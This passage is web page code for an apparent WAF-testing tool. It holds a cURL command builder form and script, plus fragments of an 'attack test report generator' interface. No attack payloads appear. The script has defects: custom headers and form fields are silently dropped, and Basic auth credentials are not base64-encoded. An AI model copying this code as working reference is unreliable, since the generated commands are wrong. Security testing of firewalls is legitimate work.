                        <label class="block text-sm font-medium text-gray-700 mb-1">Authentication Type</label>
                        <select id="curlAuthType" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            <option value="">None</option>
                            <option value="Bearer">Bearer Token</option>
                            <option value="Basic">Basic Auth</option>
                            <option value="Digest">Digest Auth</option>
                            <option value="OAuth">OAuth</option>
                            <option value="NTLM">NTLM</option>
                            <option value="Negotiate">Negotiate (Kerberos)</option>
                            <option value="AWS">AWS Signature</option>
                            <option value="Custom">Custom</option>
                        </select>
                    </div>
                    
                    <!-- Bearer Token -->
                    <div id="curlBearerAuth" class="auth-section hidden">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Bearer Token</label>
                        <input type="text" id="curlBearerToken" placeholder="Enter your token" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    </div>
                    
                    <!-- Basic Auth -->
                    <div id="curlBasicAuth" class="auth-section hidden">
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Username</label>
                                <input type="text" id="curlBasicUsername" placeholder="Username" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                                <input type="password" id="curlBasicPassword" placeholder="Password" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                        </div>
                    </div>
                    
                    <!-- Digest Auth -->
                    <div id="curlDigestAuth" class="auth-section hidden">
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Username</label>
                                <input type="text" id="curlDigestUsername" placeholder="Username" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                                <input type="password" id="curlDigestPassword" placeholder="Password" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                        </div>
                    </div>
                    
                    <!-- OAuth -->
                    <div id="curlOAuthAuth" class="auth-section hidden">
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Access Token</label>
                                <input type="text" id="curlOAuthToken" placeholder="OAuth Access Token" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Token Type</label>
                                <select id="curlOAuthTokenType" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                    <option value="Bearer">Bearer</option>
                                    <option value="MAC">MAC</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Custom Auth -->
                    <div id="curlCustomAuth" class="auth-section hidden">
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Header Name</label>
                                <input type="text" id="curlCustomAuthName" placeholder="Authorization" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-1">Header Value</label>
                                <input type="text" id="curlCustomAuthValue" placeholder="Value" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Cookie Options</label>
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Cookie Jar</label>
                                <div class="flex gap-2">
                                    <select id="curlCookieJar" class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                        <option value="">Don't use cookies</option>
                                        <option value="memory">Use cookies in memory</option>
                                        <option value="file">Save cookies to file</option>
                                    </select>
                                    <input type="text" id="curlCookieFile" placeholder="cookies.txt" 
                                           class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 hidden">
                                </div>
                            </div>
                            
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Custom Cookies</label>
                                <textarea id="curlCustomCookies" rows="3" placeholder="name1=value1; name2=value2" 
                                          class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500"></textarea>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="curl-tab-content hidden" id="curlDataTab">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Request Body Type</label>
                        <select id="curlBodyType" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            <option value="none">No Body</option>
                            <option value="raw">Raw Body</option>
                            <option value="form">Form Data</option>
                            <option value="urlencoded">URL Encoded</option>
                            <option value="binary">Binary/File</option>
                        </select>
                    </div>
                    
                    <!-- Raw Body -->
                    <div id="curlRawBody" class="body-section hidden">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Raw Body</label>
                        <textarea id="curlRawBodyContent" rows="8" placeholder="Enter raw request body (JSON, XML, text, etc.)" 
                                  class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 font-mono text-sm"></textarea>
                    </div>
                    
                    <!-- Form Data -->
                    <div id="curlFormData" class="body-section hidden">
                        <div class="flex justify-between items-center mb-1">
                            <label class="block text-sm font-medium text-gray-700">Form Data</label>
                            <button type="button" id="addFormField" 
                                    class="px-2 py-1 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-xs flex items-center">
                                <i class="fas fa-plus mr-1"></i> Add Field
                            </button>
                        </div>
                        <div id="curlFormFields" class="space-y-2 max-h-56 overflow-y-auto pr-1">
                            <!-- Form fields will be added here -->
                        </div>
                    </div>
                    
                    <!-- URL Encoded -->
                    <div id="curlUrlEncodedData" class="body-section hidden">
                        <div class="flex justify-between items-center mb-1">
                            <label class="block text-sm font-medium text-gray-700">URL Encoded Data</label>
                            <button type="button" id="addUrlEncodedField" 
                                    class="px-2 py-1 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-xs flex items-center">
                                <i class="fas fa-plus mr-1"></i> Add Field
                            </button>
                        </div>
                        <div id="curlUrlEncodedFields" class="space-y-2 max-h-56 overflow-y-auto pr-1">
                            <!-- URL encoded fields will be added here -->
                        </div>
                    </div>
                    
                    <!-- Binary/File -->
                    <div id="curlBinaryData" class="body-section hidden">
                        <label class="block text-sm font-medium text-gray-700 mb-1">File Path</label>
                        <input type="text" id="curlBinaryPath" placeholder="@/path/to/file.bin" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                        <p class="mt-1 text-xs text-gray-500">Enter file path with @ prefix (curl syntax)</p>
                    </div>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Query Parameters</label>
                        <div class="flex justify-between items-center mb-1">
                            <p class="text-xs text-gray-500">Add query string parameters (?param=value)</p>
                            <button type="button" id="addQueryParam" 
                                    class="px-2 py-1 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-xs flex items-center">
                                <i class="fas fa-plus mr-1"></i> Add Parameter
                            </button>
                        </div>
                        <div id="curlQueryParams" class="space-y-2 max-h-56 overflow-y-auto pr-1">
                            <!-- Query params will be added here -->
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Request Preview</label>
                        <div class="bg-gray-50 p-3 rounded-md border border-gray-200 max-h-48 overflow-y-auto">
                            <div id="curlRequestPreview" class="text-sm font-mono whitespace-pre-wrap"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="curl-tab-content hidden" id="curlAdvancedTab">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Advanced Options</label>
                        <div class="grid grid-cols-2 gap-2">
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlCompressed" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Compressed (--compressed)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlNoKeepalive" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">No Keepalive (--no-keepalive)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlNtlm" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">NTLM (--ntlm)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlTr" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">TCP Nodelay (--tcp-nodelay)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlTrace" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Trace (--trace)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlIncludeHeader" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Include Headers (-i)</span>
                            </label>
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Retry Options</label>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Max Retries</label>
                                <input type="number" id="curlMaxRetries" min="0" max="100" placeholder="0" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Retry Delay (seconds)</label>
                                <input type="number" id="curlRetryDelay" min="0" max="60" placeholder="0" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Output Options</label>
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Output File</label>
                                <input type="text" id="curlOutputFile" placeholder="Leave empty for stdout" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">SSL/TLS Options</label>
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">SSL Version</label>
                                <select id="curlSslVersion" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                    <option value="">Default</option>
                                    <option value="TLSv1">TLS 1.0</option>
                                    <option value="TLSv1.1">TLS 1.1</option>
                                    <option value="TLSv1.2">TLS 1.2</option>
                                    <option value="TLSv1.3">TLS 1.3</option>
                                </select>
                            </div>
                            
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Client Certificate</label>
                                <input type="text" id="curlClientCert" placeholder="Path to certificate" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Client Key</label>
                                <input type="text" id="curlClientKey" placeholder="Path to private key" 
                                       class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            </div>
                            
                            <div>
                                <label class="inline-flex items-center">
                                    <input type="checkbox" id="curlInsecureSsl" class="rounded text-cyan-600 focus:ring-cyan-500">
                                    <span class="ml-2 text-sm">Disable SSL verification (-k)</span>
                                </label>
                            </div>
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Custom curl Options</label>
                        <input type="text" id="curlCustomOptions" placeholder="--connect-timeout 10 --max-time 30" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                        <p class="mt-1 text-xs text-gray-500">Add any other curl options not covered above</p>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Command Preview -->
        <div class="mt-6 border border-gray-200 rounded-lg p-4 shadow-sm bg-gray-50">
            <div class="flex justify-between items-center mb-2">
                <h4 class="text-sm font-semibold text-gray-700">Generated cURL Command</h4>
                <div class="flex space-x-2">
                    <button id="formatCurlCommand" class="text-sm text-cyan-600 hover:text-cyan-800 transition">
                        <i class="fas fa-indent mr-1"></i> Format
                    </button>
                    <button id="copyCurlCommand" class="text-sm text-cyan-600 hover:text-cyan-800 transition">
                        <i class="fas fa-copy mr-1"></i> Copy
                    </button>
                </div>
            </div>
            <div class="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto text-sm font-mono relative">
                <pre id="curlCommandPreview" class="whitespace-pre-wrap">curl -v https://example.com</pre>
            </div>
        </div>
        
        <!-- Actions -->
        <div class="mt-6 flex justify-end space-x-4">
            <button id="resetCurlBuilder" class="px-4 py-2 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition">
                Reset
            </button>
            <button id="generateCurlCommand" class="px-4 py-2 bg-cyan-600 text-white rounded-md hover:bg-cyan-700 transition">
                Update Command
            </button>
        </div>
    </div>
</div>
<script>// cURL Payload Builder functionality
// Super-simplified and error-proof cURL Builder
document.addEventListener('DOMContentLoaded', function() {
    // Main toggle functionality
    setupToggle();
    
    // Tab navigation
    setupTabs();
    
    // Add row buttons
    setupRowButtons();
    
    // Action buttons
    setupActionButtons();
    
    // Initial rows
    createInitialRows();
    
    // All input listeners
    setupInputListeners();
    
    // Initialize values from main form
    initializeFromMainForm();
});

// Set up the toggle functionality
function setupToggle() {
    const toggle = document.getElementById('curlBuilderToggle');
    const content = document.getElementById('curlBuilderContent');
    const icon = document.getElementById('curlBuilderIcon');
    
    if (toggle && content && icon) {
        toggle.addEventListener('click', function() {
            content.classList.toggle('hidden');
            
            if (icon.classList.contains('fa-chevron-down')) {
                icon.classList.remove('fa-chevron-down');
                icon.classList.add('fa-chevron-up');
            } else {
                icon.classList.remove('fa-chevron-up');
                icon.classList.add('fa-chevron-down');
            }
            
            // Generate command when opening
            if (!content.classList.contains('hidden')) {
                safeBuildCommand();
            }
        });
    }
}

// Set up tab navigation
function setupTabs() {
    const tabs = document.querySelectorAll('.curl-tab-btn');
    if (!tabs || tabs.length === 0) return;
    
    tabs.forEach(function(tab) {
        tab.addEventListener('click', function() {
            // First, remove active class from all tabs
            tabs.forEach(function(t) {
                t.classList.remove('text-cyan-600', 'border-cyan-600');
                t.classList.add('text-gray-500', 'border-transparent');
            });
            
            // Add active class to clicked tab
            this.classList.remove('text-gray-500', 'border-transparent');
            this.classList.add('text-cyan-600', 'border-cyan-600');
            
            // Hide all content
            const contents = document.querySelectorAll('.curl-tab-content');
            contents.forEach(function(c) {
                c.classList.add('hidden');
            });
            
            // Show selected content
            const tabName = this.getAttribute('data-tab');
            if (tabName) {
                const contentId = 'curl' + tabName.charAt(0).toUpperCase() + tabName.slice(1) + 'Tab';
                const content = document.getElementById(contentId);
                if (content) {
                    content.classList.remove('hidden');
                }
            }
            
            // Update command
            safeBuildCommand();
        });
    });
}

// Set up buttons for adding rows
function setupRowButtons() {
    setupAddButton('addCustomHeader', 'curlCustomHeaders');
    setupAddButton('addFormField', 'curlFormFields');
    setupAddButton('addUrlEncodedField', 'curlUrlEncodedFields');
    setupAddButton('addQueryParam', 'curlQueryParams');
}

// Helper for setting up add buttons
function setupAddButton(buttonId, containerId) {
    const button = document.getElementById(buttonId);
    if (button) {
        button.addEventListener('click', function() {
            addRow(containerId);
            safeBuildCommand();
        });
    }
}

// Set up action buttons
function setupActionButtons() {
    // Copy button
    const copyBtn = document.getElementById('copyCurlCommand');
    if (copyBtn) {
        copyBtn.addEventListener('click', function() {
            const preview = document.getElementById('curlCommandPreview');
            if (preview && preview.textContent) {
                navigator.clipboard.writeText(preview.textContent).then(function() {
                    copyBtn.innerHTML = '<i class="fas fa-check mr-1"></i> Copied!';
                    setTimeout(function() {
                        copyBtn.innerHTML = '<i class="fas fa-copy mr-1"></i> Copy';
                    }, 2000);
                });
            }
        });
    }
    
    // Format button
    const formatBtn = document.getElementById('formatCurlCommand');
    if (formatBtn) {
        formatBtn.addEventListener('click', function() {
            formatCommand();
        });
    }
    
    // Reset button
    const resetBtn = document.getElementById('resetCurlBuilder');
    if (resetBtn) {
        resetBtn.addEventListener('click', function() {
            resetBuilder();
        });
    }
    
    // Generate button
    const generateBtn = document.getElementById('generateCurlCommand');
    if (generateBtn) {
        generateBtn.addEventListener('click', function() {
            safeBuildCommand();
        });
    }
}

// Create initial rows
function createInitialRows() {
    addRow('curlCustomHeaders');
    addRow('curlFormFields');
    addRow('curlUrlEncodedFields');
    addRow('curlQueryParams');
}

// Add a row to a container
function addRow(containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;
    
    const row = document.createElement('div');
    row.className = 'flex gap-2 items-center mb-2';
    
    row.innerHTML = `
        <input type="text" placeholder="Name" class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
        <input type="text" placeholder="Value" class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
        <button type="button" class="px-2 py-2 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition">
            <i class="fas fa-times"></i>
        </button>
    `;
    
    // Add remove handler
    const removeBtn = row.querySelector('button');
    if (removeBtn) {
        removeBtn.addEventListener('click', function() {
            row.remove();
            safeBuildCommand();
        });
    }
    
    // Add input handlers
    const inputs = row.querySelectorAll('input');
    inputs.forEach(function(input) {
        input.addEventListener('input', function() {
            safeBuildCommand();
        });
    });
    
    container.appendChild(row);
}

// Set up listeners for all inputs
function setupInputListeners() {
    const inputs = document.querySelectorAll('#curlBuilderContent input, #curlBuilderContent select, #curlBuilderContent textarea');
    
    inputs.forEach(function(input) {
        if (input.type === 'button' || input.type === 'submit') return;
        
        if (input.type === 'checkbox' || input.tagName === 'SELECT') {
            input.addEventListener('change', function() {
                safeBuildCommand();
            });
        } else {
            input.addEventListener('input', function() {
                safeBuildCommand();
            });
        }
    });
    
    // Special handling for auth type
    const authType = document.getElementById('curlAuthType');
    if (authType) {
        authType.addEventListener('change', function() {
            handleAuthTypeChange(this.value);
        });
    }
    
    // Special handling for body type
    const bodyType = document.getElementById('curlBodyType');
    if (bodyType) {
        bodyType.addEventListener('change', function() {
            handleBodyTypeChange(this.value);
        });
    }
}

// Handle auth type change
function handleAuthTypeChange(type) {
    // Hide all auth sections
    const sections = document.querySelectorAll('.auth-section');
    sections.forEach(function(section) {
        section.classList.add('hidden');
    });
    
    // Show selected section
    if (type) {
        const section = document.getElementById('curl' + type + 'Auth');
        if (section) {
            section.classList.remove('hidden');
        }
    }
    
    safeBuildCommand();
}

// Handle body type change
function handleBodyTypeChange(type) {
    // Hide all body sections
    const sections = document.querySelectorAll('.body-section');
    sections.forEach(function(section) {
        section.classList.add('hidden');
    });
    
    // Show selected section
    if (type && type !== 'none') {
        const sectionId = 'curl' + type.charAt(0).toUpperCase() + type.slice(1) + 'Body';
        const section = document.getElementById(sectionId);
        if (section) {
            section.classList.remove('hidden');
        }
    }
    
    safeBuildCommand();
}

// Initialize from main form
function initializeFromMainForm() {
    // Get target URL
    const mainUrl = document.getElementById('targetUrl');
    const curlUrl = document.getElementById('curlUrl');
    if (mainUrl && curlUrl && mainUrl.value) {
        curlUrl.value = mainUrl.value;
    } else if (curlUrl) {
        curlUrl.value = 'https://example.com';
    }
    
    // Get proxy
    const mainProxy = document.getElementById('proxyUrl');
    const curlProxy = document.getElementById('curlProxy');
    if (mainProxy && curlProxy && mainProxy.value) {
        curlProxy.value = mainProxy.value;
    }
}

// Reset the builder
function resetBuilder() {
    // Reset inputs
    const inputs = document.querySelectorAll('#curlBuilderContent input:not([type="button"]):not([type="submit"]), #curlBuilderContent select, #curlBuilderContent textarea');
    
    inputs.forEach(function(input) {
        if (input.type === 'checkbox') {
            input.checked = false;
        } else if (input.tagName === 'SELECT') {
            if (input.id === 'curlMethod') {
                input.value = 'GET'; // Default to GET
            } else {
                input.value = '';
            }
        } else {
            input.value = '';
        }
    });
    
    // Hide all sections
    document.querySelectorAll('.auth-section, .body-section').forEach(function(section) {
        section.classList.add('hidden');
    });
    
    // Clear and reset containers
    ['curlCustomHeaders', 'curlFormFields', 'curlUrlEncodedFields', 'curlQueryParams'].forEach(function(id) {
        const container = document.getElementById(id);
        if (container) {
            container.innerHTML = '';
            addRow(id);
        }
    });
    
    // Reset URL to main URL
    initializeFromMainForm();
    
    // Rebuild command
    safeBuildCommand();
}

// Format the command for better readability
function formatCommand() {
    const preview = document.getElementById('curlCommandPreview');
    if (!preview) return;
    
    let command = preview.textContent || '';
    
    // Replace with newlines
    let formatted = command
        .replace(/ -H /g, ' \\\n  -H ')
        .replace(/ -d /g, ' \\\n  -d ')
        .replace(/ --data-binary /g, ' \\\n  --data-binary ')
        .replace(/ -X /g, ' \\\n  -X ')
        .replace(/ -x /g, ' \\\n  -x ')
        .replace(/ -u /g, ' \\\n  -u ')
        .replace(/ --digest /g, ' \\\n  --digest ')
        .replace(/ "/g, ' \\\n  "');
    
    preview.textContent = formatted;
}

// Safely build the curl command
function safeBuildCommand() {
    try {
        // Get basic values
        const method = document.getElementById('curlMethod')?.value || 'GET';
        const url = document.getElementById('curlUrl')?.value || 'https://example.com';
        
        // Start with the basic command
        let command = 'curl';
        
        // Add HTTP method if not GET
        if (method !== 'GET') {
            command += ` -X ${method}`;
        }
        
        // Add basic options
        if (document.getElementById('curlVerbose')?.checked) {
            command += ' -v';
        }
        
        if (document.getElementById('curlInsecure')?.checked) {
            command += ' -k';
        }
        
        if (document.getElementById('curlHeaders')?.checked) {
            command += ' -i';
        }
        
        if (document.getElementById('curlFollowRedirects')?.checked) {
            command += ' -L';
        }
        
        // Add proxy if provided
        const proxy = document.getElementById('curlProxy')?.value;
        if (proxy) {
            command += ` -x "${safeEscape(proxy)}"`;
        }
        
        // Add content type if provided
        const contentType = document.getElementById('curlContentType')?.value;
        if (contentType && contentType !== '') {
            if (contentType === 'custom') {
                const customType = document.getElementById('curlCustomContentType')?.value;
                if (customType) {
                    command += ` -H "Content-Type: ${safeEscape(customType)}"`;
                }
            } else {
                command += ` -H "Content-Type: ${safeEscape(contentType)}"`;
            }
        }
        
        // Add accept header if provided
        const accept = document.getElementById('curlAccept')?.value;
        if (accept && accept !== '') {
            if (accept === 'custom') {
                const customAccept = document.getElementById('curlCustomAccept')?.value;
                if (customAccept) {
                    command += ` -H "Accept: ${safeEscape(customAccept)}"`;
                }
            } else {
                command += ` -H "Accept: ${safeEscape(accept)}"`;
            }
        }
        
        // Add auth header based on type
        const authType = document.getElementById('curlAuthType')?.value;
        if (authType) {
            switch (authType) {
                case 'Bearer':
                    const token = document.getElementById('curlBearerToken')?.value;
                    if (token) {
                        command += ` -H "Authorization: Bearer ${safeEscape(token)}"`;
                    }
                    break;
                case 'Basic':
                    const username = document.getElementById('curlBasicUsername')?.value || '';
                    const password = document.getElementById('curlBasicPassword')?.value || '';
                    if (username || password) {
                        command += ` -H "Authorization: Basic ${safeEscape(username + ':' + password)}"`;
                    }
                    break;
                case 'Digest':
                    const digestUser = document.getElementById('curlDigestUsername')?.value || '';
                    const digestPass = document.getElementById('curlDigestPassword')?.value || '';
                    if (digestUser || digestPass) {
                        command += ` --digest -u "${safeEscape(digestUser + ':' + digestPass)}"`;
                    }
                    break;
                case 'Custom':
                    const authName = document.getElementById('curlCustomAuthName')?.value || 'Authorization';
                    const authValue = document.getElementById('curlCustomAuthValue')?.value || '';
                    if (authValue) {
                        command += ` -H "${safeEscape(authName)}: ${safeEscape(authValue)}"`;
                    }
                    break;
            }
        }
        
        // Add custom headers
        addKeyValuePairsToCommand(command, 'curlCustomHeaders', '-H');
        
        // Add body data if not GET
        if (method !== 'GET') {
            const bodyType = document.getElementById('curlBodyType')?.value;
            if (bodyType && bodyType !== 'none') {
                switch (bodyType) {
                    case 'raw':
                        const rawData = document.getElementById('curlRawBodyContent')?.value;
                        if (rawData) {
                            command += ` -d "${safeEscape(rawData)}"`;
                        }
                        break;
                    case 'form':
                        addKeyValuePairsToCommand(command, 'curlFormFields', '-d');
                        break;
                    case 'binary':
                        const binaryData = document.getElementById('curlBinaryPath')?.value;
                        if (binaryData) {
                            command += ` --data-binary "${safeEscape(binaryData)}"`;
                        }
                        break;
                }
            }
        }
        
        // Add URL at the end
        command += ` "${safeEscape(url)}"`;
        
        // Update the preview
        const preview = document.getElementById('curlCommandPreview');
        if (preview) {
            preview.textContent = command;
        }
        
        return command;
    } catch (error) {
        console.error("Error building command:", error);
        
        // Fallback to a safe command
        const fallbackCommand = 'curl -v "https://example.com"';
        const preview = document.getElementById('curlCommandPreview');
        if (preview) {
            preview.textContent = fallbackCommand;
        }
        return fallbackCommand;
    }
}

// Helper function to safely add key-value pairs to command
function addKeyValuePairsToCommand(command, containerId, flag) {
    const container = document.getElementById(containerId);
    if (!container) return command;
    
    let result = command;
    const rows = container.querySelectorAll('.flex');
    
    rows.forEach(function(row) {
        const inputs = row.querySelectorAll('input');
        if (inputs.length >= 2) {
            const key = inputs[0].value.trim();
            const value = inputs[1].value.trim();
            
            if (key) {
                if (flag === '-H') {
                    // For headers
                    result += ` ${flag} "${safeEscape(key)}: ${safeEscape(value)}"`;
                } else {
                    // For form data
                    result += ` ${flag} "${safeEscape(key)}=${safeEscape(value)}"`;
                }
            }
        }
    });
    
    return result;
}

// Helper function to safely escape strings
function safeEscape(str) {
    if (!str) return '';
    
    // Make sure str is a string
    const text = String(str);
    
    return text
        .replace(/\\/g, '\\\\')  // Escape backslashes
        .replace(/"/g, '\\"')    // Escape double quotes
        .replace(/\$/g, '\\$')   // Escape dollar signs
        .replace(/`/g, '\\`');   // Escape backticks
}</script>



















        <!-- Test Categories -->
        <div id="testContainer" class="space-y-4">
            <!-- Categories will be inserted here -->
        </div>

        <!-- Generate Button -->
        <div class="fixed bottom-6 right-6">
            <button onclick="generateCommands()" 
                    class="bg-cyan-600 text-white px-6 py-3 rounded-lg shadow-lg hover:bg-cyan-700 transition flex items-center">
                <i class="fas fa-terminal mr-2"></i>Generate Curl Commands
                <span id="selectedBadge" class="ml-2 bg-white text-cyan-600 px-2 py-0.5 rounded-full text-sm font-semibold">0</span>
            </button>
        </div>
    </main>

    <!-- Output Modal -->
    <div id="outputModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-lg shadow-xl w-full max-w-5xl max-h-[90vh] overflow-hidden">
                <div class="bg-gray-50 border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                    <h3 class="text-lg font-semibold">Generated Curl Commands</h3>
                    <div class="flex gap-2">
                        <button onclick="copyCommands()" class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm">
                            <i class="fas fa-copy mr-1"></i>Copy All
                        </button>
                        <button onclick="downloadCommands()" class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm">
                            <i class="fas fa-download mr-1"></i>Download
                        </button>
                        <button onclick="closeModal()" class="text-gray-500 hover:text-gray-700">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                </div>
                <div class="p-6 overflow-y-auto" style="max-height: 75vh;">
                    <pre id="outputContent" class="code-output p-4 rounded-lg overflow-x-auto"></pre>
                </div>
            </div>
        </div>
    </div>
















































<!-- Advanced WAF Header Attack Test Report Generator - Enterprise Edition -->

<!-- Required Libraries -->
<script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/luxon@3.4.3/build/global/luxon.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/file-saver@2.0.5/dist/FileSaver.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>

<!-- Advanced WAF Header Attack Test Report Generator - Enterprise Edition -->
<div class="waf-report-generator-container">
    <!-- Floating Action Button -->
    <div class="waf-report-fab">
        <button id="wafReportFabButton" class="waf-report-fab-button pulse-animation" onclick="toggleReportPanel()">
            <i class="fas fa-file-excel"></i>
        </button>
        <span class="waf-report-fab-label">Excel Report Generator</span>
    </div>

    <!-- Report Configuration Panel -->
    <div id="wafReportPanel" class="waf-report-panel">
        <div class="waf-report-panel-header">
            <h2><i class="fas fa-chart-bar"></i> WAF Attack Report Generator</h2>
            <button class="waf-report-panel-close" onclick="toggleReportPanel()">
                <i class="fas fa-times"></i>
            </button>
        </div>
        
        <div class="waf-report-panel-content">
            <!-- Report Preview Tabs -->
            <div class="waf-report-tabs">
                <button class="waf-report-tab active" onclick="switchTab(this, 'waf-options')">Options</button>
